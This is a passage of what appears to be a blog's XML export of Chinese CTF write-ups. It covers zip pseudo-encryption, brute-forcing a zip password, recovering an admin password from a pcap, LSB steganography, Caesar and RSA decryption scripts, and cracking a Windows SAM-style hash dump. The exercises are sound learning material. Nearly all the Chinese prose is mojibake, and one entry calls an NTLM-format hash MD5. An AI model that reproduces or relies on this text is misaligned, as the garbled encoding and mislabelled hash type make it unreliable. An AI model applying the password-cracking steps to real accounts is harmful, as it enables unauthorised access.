<h3 id="x-y"><a href="#x-y" class="headerlink" title="x|y"></a>x|y</h3><p><strong>x|yï¼ŒåŒ¹é… x æˆ– yã€‚<br>ä¾‹å¦‚ï¼Œâ€™z|foodâ€™ èƒ½åŒ¹é… â€œzâ€ æˆ– â€œfoodâ€ã€‚â€™(z|f)oodâ€™ åˆ™åŒ¹é… â€œzoodâ€ æˆ– â€œfoodâ€ã€‚</strong></p>
]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonéƒ¨åˆ†çŸ¥è¯†ç‚¹</title>
    <url>/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åˆ—è¡¨çš„æ–¹æ³•"><a href="#åˆ—è¡¨çš„æ–¹æ³•" class="headerlink" title="åˆ—è¡¨çš„æ–¹æ³•"></a>åˆ—è¡¨çš„æ–¹æ³•</h2><p><img src="https://img-blog.csdnimg.cn/8199ffcbcaed48d289971c6f7fcef868.png#pic_center" alt="1"></p>
<h2 id="åˆ—è¡¨çš„ç‰¹ç‚¹"><a href="#åˆ—è¡¨çš„ç‰¹ç‚¹" class="headerlink" title="åˆ—è¡¨çš„ç‰¹ç‚¹"></a>åˆ—è¡¨çš„ç‰¹ç‚¹</h2><p><img src="https://img-blog.csdnimg.cn/931e8889a21040b7a22be771851fec85.png#pic_center" alt="2"></p>
<h2 id="whileå¾ªç¯ä¸forå¾ªç¯çš„å¯¹æ¯”"><a href="#whileå¾ªç¯ä¸forå¾ªç¯çš„å¯¹æ¯”" class="headerlink" title="whileå¾ªç¯ä¸forå¾ªç¯çš„å¯¹æ¯”"></a>whileå¾ªç¯ä¸forå¾ªç¯çš„å¯¹æ¯”</h2><p><img src="https://img-blog.csdnimg.cn/9e00c957396d443cb930f782490b7c06.png#pic_center" alt="3"></p>
<h2 id="å­—ç¬¦ä¸²å¸¸ç”¨æ“ä½œ"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ“ä½œ" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ“ä½œ"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ“ä½œ</h2><p><img src="https://img-blog.csdnimg.cn/6f36aeff3ac04f34ba832b2b58ecea21.png#pic_center" alt="1"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ptython</tag>
      </tags>
  </entry>
  <entry>
    <title>zipä¼ªåŠ å¯†</title>
    <url>/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>



<p><strong>zipä¼ªåŠ å¯†</strong>æ˜¯åœ¨æ–‡ä»¶å¤´çš„åŠ å¯†æ ‡å¿—ä½åšä¿®æ”¹ï¼Œè¿›è€Œå†æ‰“å¼€æ–‡ä»¶æ—¶è¯†è¢«åˆ«ä¸ºåŠ å¯†å‹ç¼©åŒ…</p>
<p>ä¸€ä¸ª ZIP æ–‡ä»¶ç”±<strong>ä¸‰ä¸ªéƒ¨åˆ†</strong>ç»„æˆï¼š</p>
<p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</p>
<h2 id="å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"><a href="#å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š"></a>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š</h2><p>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰</p>
<p>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬</p>
<p>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰</p>
<p>08 00ï¼šå‹ç¼©æ–¹å¼</p>
<p>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´</p>
<p>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ</p>
<p>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰</p>
<p>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰</p>
<p>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰</p>
<p>07 00ï¼šæ–‡ä»¶åé•¿åº¦</p>
<p>00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦</p>
<h2 id="å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"><a href="#å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"></a>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</h2><p>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50)</p>
<p>3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬</p>
<p>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬</p>
<p>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰</p>
<p>08 00ï¼šå‹ç¼©æ–¹å¼</p>
<p>5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´</p>
<p>F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ</p>
<p>16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰</p>
<p>19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰</p>
<p>17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰</p>
<p>07 00ï¼šæ–‡ä»¶åé•¿åº¦</p>
<p>24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦</p>
<p>00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦</p>
<p>00 00ï¼šç£ç›˜å¼€å§‹å·</p>
<p>00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§</p>
<p>20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§</p>
<p>00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡</p>
<h2 id="å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"><a href="#å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š" class="headerlink" title="å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"></a>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š</h2><p>50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®°</p>
<p>00 00ï¼šå½“å‰ç£ç›˜ç¼–å·</p>
<p>00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·</p>
<p>01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°</p>
<p>01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•°</p>
<p>59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å°</p>
<p>3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡</p>
<p>00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</p>
<p>å› æ­¤ï¼Œæ ¹æ®æ­¤é¢˜ç›®æ¥çœ‹ï¼š</p>
<p><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</strong>ï¼š50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°</p>
<p><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</strong></p>
<p>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°</p>
<p>3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬ </p>
<p>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </p>
<p>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰</p>
<p><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</strong> ï¼š50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®° </p>
<p><img src="https://img-blog.csdnimg.cn/b4f6011275304c798465c33b8b83a77e.png" alt="1"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfä¹‹MISC</title>
    <url>/2023/01/10/buuctf%E4%B9%8BMISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h2><blockquote>
<p>ç»™ä½ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½ å¹¶ä¸èƒ½è·å¾—ä»€ä¹ˆï¼Œå› ä¸ºä»–æ˜¯å››ä½æ•°å­—åŠ å¯†çš„å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚ã€‚ã€‚ä¸å¯¹&#x3D; &#x3D;æˆ‘è¯´äº†ä»€ä¹ˆäº†ä¸å¾—çš„ä¸œè¥¿ã€‚ã€‚ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
</blockquote>
<p>ä¸‹è½½æ–‡ä»¶è§£å‹ä¹‹ååˆå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…flag.txtè¢«åŠ å¯†äº†ï¼Œæç¤ºå¯†ç æ˜¯ä¸€ä¸ª4ä½æ•°å­—ï¼Œç”¨ARCHPRè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œé€‰æ‹©å­—å…¸è¿›è¡Œçˆ†ç ´<br><img src="https://img-blog.csdnimg.cn/c5332cec653f456dbf9d874b3cb7a2c3.png" alt="1"><br>å¾—åˆ°å¯†ç ï¼Œè¾“å…¥å¯†ç åå¾—åˆ°ä¸€ä¸ªbase64åŠ å¯†çš„å¯†æ–‡ï¼Œè§£å¯†åä¸ºflagã€‚</p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote>
<p>é»‘å®¢é€šè¿‡wiresharkæŠ“åˆ°ç®¡ç†å‘˜ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼ˆç®¡ç†å‘˜çš„å¯†ç å³æ˜¯ç­”æ¡ˆ) æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
</blockquote>
<p>å¾—åˆ°ä¸€ä¸ªpcapæ–‡ä»¶</p>
<blockquote>
<p> pcapæ–‡ä»¶æ˜¯å¸¸ç”¨çš„æ•°æ®æŠ¥å­˜å‚¨æ ¼å¼ï¼Œå¯ä»¥ç†è§£ä¸ºå°±æ˜¯ä¸€ç§æ–‡ä»¶æ ¼å¼ï¼Œåªä¸è¿‡é‡Œé¢çš„æ•°æ®æ˜¯æŒ‰ç…§ç‰¹å®šæ ¼å¼å­˜å‚¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦è§£æé‡Œé¢çš„æ•°æ®ï¼Œä¹Ÿå¿…é¡»æŒ‰ç…§ä¸€å®šçš„æ ¼å¼ã€‚æ™®é€šçš„è®°äº‹æœ¬æ‰“å¼€pcapæ–‡ä»¶æ˜¾ç¤ºçš„æ˜¯ä¹±ç ï¼Œç”¨å®‰è£…äº†HEX-Editoræ’ä»¶çš„Notepad++æ‰“å¼€ï¼Œèƒ½å¤Ÿä»¥16è¿›åˆ¶æ•°æ®çš„æ ¼å¼æ˜¾ç¤ºï¼Œç”¨wiresharkè¿™ç§æŠ“åŒ…å·¥å…·å°±å¯ä»¥æ­£å¸¸æ‰“å¼€è¿™ç§æ–‡ä»¶ï¼Œæ„‰å¿«åœ°æŸ¥çœ‹é‡Œé¢çš„ç½‘ç»œæ•°æ®æŠ¥äº†ï¼ŒåŒæ—¶wiresharkä¹Ÿå¯ä»¥ç”Ÿæˆè¿™ç§æ ¼å¼çš„æ–‡ä»¶ã€‚å½“ç„¶è¿™äº›å·¥å…·åªæ˜¯æˆ‘ç»å¸¸ä½¿ç”¨çš„ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶å®ƒèƒ½å¤ŸæŸ¥çœ‹pcapæ–‡ä»¶çš„å·¥å…·ã€‚</p>
</blockquote>
<p>æ˜¾ç„¶æ˜¯æµé‡åˆ†æï¼Œç™»é™†ç½‘ç«™ä¸€èˆ¬æ˜¯HTTP postè¯·æ±‚ï¼Œç”¨wiresharkæ‰“å¼€è¿™ä¸ªpcapæ•°æ®åŒ…åï¼ŒæŸ¥æ‰¾http,åªæœ‰ä¸€ä¸ªpostè¯·æ±‚<br><img src="https://img-blog.csdnimg.cn/2d8aee32f07a487d850f0b12fbd4e267.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/6128dbdf6f9c4bbabe0e3ab4d8e36c64.png" alt="2"><br>æ‰¾åˆ°flag.</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>æ‰“å¼€åç»™ä¸€ä¸ªæ ¡å¾½ï¼Œç”±äºé¢˜ç›®æ˜¯LSB</p>
<p><img src="https://img-blog.csdnimg.cn/64da9c8efb0a43d9b91316ee9b886da0.png" alt="1"></p>
<blockquote>
<p>LSBå…¨ç§°leastsignificant bitï¼Œæ˜¯ä¸€ç§åŸºäºå›¾ç‰‡æœ€ä½æœ‰æ•ˆä½ä¿®æ”¹å‚¨å­˜ä¿¡æ¯çš„éšå†™æ–¹æ³•ï¼Œå›¾ç‰‡é‡‡ç”¨åƒç´ ç‚¹æ„ä¹˜ï¼Œåˆ©ç”¨äººè‚‰çœ¼è§†è§‰åˆ†è¾¨ç‡çš„é™åˆ¶ï¼Œåƒç´ ç‚¹çš„ä½ä½å˜åŒ–å¼•èµ·å›¾ç‰‡æ•´ä½“çš„å˜åŒ–å¾®ä¹å…¶å¾®ï¼Œè‚‰çœ¼ä¸è¶³ä¸å¯Ÿè§‰å‡ºå¼‚å¸¸ã€‚åŒæ ·çš„MLSBæ—¨åœ¨ä¸è¢«äººçœ¼å¯Ÿè§‰å‡ºå¼‚å¸¸çš„æƒ…å†µä¸‹ï¼Œå°½å¯èƒ½çš„å¤šè—å‡ ä½ä¿¡æ¯ï¼Œä»è€Œæé«˜æ¶ˆæ¯éšè—çš„æ•ˆç‡å’Œå®¹é‡ã€‚</p>
</blockquote>
<p>é‚£å°±ç”¨stegsolveæ‰“å¼€<br><img src="https://img-blog.csdnimg.cn/ef28ba074c0f480fb77fdf873f929c14.png" alt="2"><br>å¾—åˆ°ä¸€ä¸ªäºŒç»´ç <br><img src="https://img-blog.csdnimg.cn/1f0756bb9f6e4fb6824fb3d4c92ef795.png" alt="3"><br>æ‰«äºŒç»´ç å¾—åˆ°flagã€‚</p>
<h2 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h2><p>è¢«ä¼ªåŠ å¯†äº†ï¼Œç”¨010editoræ‰“å¼€<br><img src="https://img-blog.csdnimg.cn/81cfb24d08d3451580870b94ad0da351.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/da5cdea1475a4986bf29cd72e26ecbf5.png" alt="2"><br><strong>09 00æ”¹ä¸º00 00</strong>ä¿å­˜åå¾—åˆ°flagã€‚<strong>flag{Adm1N-B2G-kU-SZIP}</strong></p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfä¹‹cryptoéƒ¨åˆ†è§£é¢˜æ€è·¯</title>
    <url>/2023/01/09/buuctf%E4%B9%8Bcrypto%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å¤§å¸çš„å¯†ç æ­¦å™¨"><a href="#å¤§å¸çš„å¯†ç æ­¦å™¨" class="headerlink" title="å¤§å¸çš„å¯†ç æ­¦å™¨"></a>å¤§å¸çš„å¯†ç æ­¦å™¨</h2><p><strong>é¢˜ç›®</strong></p>
<blockquote>
<p>å…¬å…ƒå‰ä¸€ç™¾å¹´ï¼Œåœ¨ç½—é©¬å‡ºç”Ÿäº†ä¸€ä½å¯¹ä¸–ç•Œå½±å“å·¨å¤§çš„äººç‰©ï¼Œä»–ç”Ÿå‰æ˜¯ç½—é©¬ä¸‰å·¨å¤´ä¹‹ä¸€ã€‚<br>ä»–ç‡å…ˆä½¿ç”¨äº†ä¸€ç§ç®€å•çš„åŠ å¯†å‡½ï¼Œå› æ­¤è¿™ç§åŠ å¯†æ–¹æ³•ä»¥ä»–çš„åå­—å‘½åã€‚<br>ä»¥ä¸‹å¯†æ–‡è¢«è§£å¼€åå¯ä»¥è·å¾—ä¸€ä¸ªæœ‰æ„ä¹‰çš„å•è¯ï¼š<strong>FRPHEVGL</strong><br>ä½ å¯ä»¥ç”¨è¿™ä¸ªç›¸åŒçš„åŠ å¯†å‘é‡åŠ å¯†é™„ä»¶ä¸­çš„å¯†æ–‡ï¼Œä½œä¸ºç­”æ¡ˆè¿›è¡Œæäº¤ã€‚</p>
</blockquote>
<p>è¿›è¡Œå‡¯æ’’å¯†ç è§£å¯†<br>pythonè„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token builtin">max</span><span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        plaint<span class="token operator">=</span><span class="token string">''</span>
        <span class="token keyword">for</span> s <span class="token keyword">in</span> secret<span class="token punctuation">:</span>
            o<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>offset
            o<span class="token operator">=</span><span class="token punctuation">(</span>o<span class="token operator">-</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> o<span class="token operator">></span><span class="token builtin">max</span> <span class="token keyword">else</span> o
            plaint<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plaint<span class="token punctuation">,</span>offset<span class="token punctuation">)</span>

str_secret<span class="token operator">=</span><span class="token string">'FRPHEVGL'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
decode<span class="token punctuation">(</span>str_secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°ï¼š</p>
<blockquote>
<p>frphevgl 0<br>gsqifwhm 1<br>htrjgxin 2<br>iuskhyjo 3<br>jvtlizkp 4<br>kwumjalq 5<br>lxvnkbmr 6<br>mywolcns 7<br>nzxpmdot 8<br>oayqnepu 9<br>pbzrofqv 10<br>qcaspgrw 11<br>rdbtqhsx 12<br>security 13<br>tfdvsjuz 14<br>ugewtkva 15<br>vhfxulwb 16<br>wigyvmxc 17<br>xjhzwnyd 18<br>ykiaxoze 19<br>zljbypaf 20<br>amkczqbg 21<br>bnldarch 22<br>comebsdi 23<br>dpnfctej 24<br>eqogdufk 25</p>
</blockquote>
<p>ç§»ä½13å¾—åˆ°securityã€‚å†å¯¹é™„ä»¶ä¸­çš„å¯†æ–‡åŠ å¯†ï¼šComeChina<br>æ³¨æ„å¤§å°å†™</p>
<p><img src="https://img-blog.csdnimg.cn/cc5d04de020147259e4ab27b26e5a941.png" alt="1"><br>Pè¦å¤§å†™<strong>flag{PbzrPuvan}</strong></p>
<h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><blockquote>
<p>Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.&#x2F;&#x2F;æ•°å­¦å¾ˆé…·ï¼ä½¿ç”¨ RSA ç®—æ³•è§£ç ç§˜å¯†æ¶ˆæ¯ï¼Œcã€ pã€ q å’Œ e æ˜¯ RSA ç®—æ³•çš„å‚æ•°</p>
</blockquote>
<blockquote>
<p>p &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483<br>q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407<br>e &#x3D;  65537<br>c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</p>
</blockquote>
<blockquote>
<p>Use RSA to find the secret message&#x2F;&#x2F;ä½¿ç”¨RSAæ¥æ‰¾åˆ°ç§˜å¯†æ¶ˆæ¯</p>
</blockquote>
<p>å·²çŸ¥c,p,q,e,n&#x3D;p*q,æ±‚æ˜æ–‡M<br>pythonè„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''å·²çŸ¥p,q,e,c.å¾ˆæ˜æœ—äº†ï¼Œæ±‚då†è§£ï¼š'''</span>
<span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> <span class="token number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>
q <span class="token operator">=</span> <span class="token number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token comment"># å¯†æ–‡</span>
C <span class="token operator">=</span> <span class="token number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token comment"># æ±‚æ˜æ–‡</span>
M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>C<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># å¿«é€Ÿæ±‚å¹‚å–æ¨¡è¿ç®—</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è§£å‡ºMå€¼ï¼š5577446633554466577768879988<br><strong>flag{5577446633554466577768879988}</strong></p>
<h2 id="Windowsç³»ç»Ÿå¯†ç "><a href="#Windowsç³»ç»Ÿå¯†ç " class="headerlink" title="Windowsç³»ç»Ÿå¯†ç "></a>Windowsç³»ç»Ÿå¯†ç </h2><p>å†…å®¹ï¼š</p>
<blockquote>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</p>
</blockquote>
<p>åƒhashå¯†ç ï¼Œ<strong>å¸¸ç”¨hashç®—æ³•ï¼š</strong><br><img src="https://img-blog.csdnimg.cn/93de742bfb504a6ebe0ea469b3fe75d1.png" alt="1"><br>å…ˆè¯•è¯•MD5ï¼Œ<strong>a7fcb22a88038f35a8f39d503e7f0062</strong>æ˜æ–‡ä¸º<strong>good-luck</strong><a href="https://www.cmd5.com/">md5è§£å¯†</a><br><strong>flag{good-luck}</strong></p>
<h2 id="ä¸­æ–‡ç”µç "><a href="#ä¸­æ–‡ç”µç " class="headerlink" title="ä¸­æ–‡ç”µç "></a>ä¸­æ–‡ç”µç </h2><h3 id="æ¥æº"><a href="#æ¥æº" class="headerlink" title="æ¥æº"></a>æ¥æº</h3><p>ã€€ã€€ä¸­æ–‡ç”µç ï¼Œåˆç§°ä¸­æ–‡å•†ç”¨ç”µç ã€ä¸­æ–‡ç”µæŠ¥ç æˆ–ä¸­æ–‡ç”µæŠ¥æ˜ç ï¼ŒåŸæœ¬æ˜¯äºç”µæŠ¥ä¹‹ä¸­ä¼ é€ä¸­æ–‡ä¿¡æ¯çš„æ–¹æ³•ã€‚å®ƒæ˜¯ç¬¬ä¸€ä¸ªæŠŠæ±‰å­—åŒ–ä½œç”µå­è®¯å·çš„ç¼–ç è¡¨ã€‚<br>ã€€ã€€è‡ªæ‘©å°”æ–¯ç”µç åœ¨1835å¹´å‘æ˜åï¼Œä¸€ç›´åªèƒ½ç”¨æ¥ä¼ é€è‹±è¯­æˆ–ä»¥æ‹‰ä¸å­—æ¯æ‹¼å†™çš„æ–‡å­—ã€‚1873å¹´ï¼Œæ³•å›½é©»åäººå‘˜å¨åŸºæ°ï¼ˆSÂ·AÂ·Viguerï¼‰å‚ç…§ã€Šåº·ç†™å­—å…¸ã€‹çš„éƒ¨é¦–æ’åˆ—æ–¹æ³•ï¼ŒæŒ‘é€‰äº†å¸¸ç”¨æ±‰å­—6800å¤šä¸ªï¼Œç¼–æˆäº†ç¬¬ä¸€éƒ¨æ±‰å­—ç”µç æœ¬ï¼Œåä¸ºã€Šç”µæŠ¥æ–°ä¹¦ã€‹ã€‚åç”±æˆ‘å›½çš„éƒ‘è§‚åº”å°†å…¶æ”¹ç¼–æˆä¸ºã€Šä¸­å›½ç”µæŠ¥æ–°ç¼–ã€‹ã€‚è¿™æ˜¯ä¸­å›½æœ€æ—©çš„æ±‰å­—ç”µç æœ¬ã€‚ä¸­å›½äººæœ€æ—©ç ”åˆ¶çš„ç”µæŠ¥æœºåä¾¨å•†äººç‹æ‰¿è£ä»æ³•å›½å›å›½åï¼Œä¸ç¦å·çš„ç‹æ–Œç ”åˆ¶å‡ºæˆ‘å›½ç¬¬ä¸€å°ç”µæŠ¥æœºï¼Œå¹¶å‘ˆè¯·æ”¿åºœè‡ªåŠç”µæŠ¥ã€‚æ¸…æ”¿åºœæ‹’ä¸é‡‡çº³ã€‚</p>
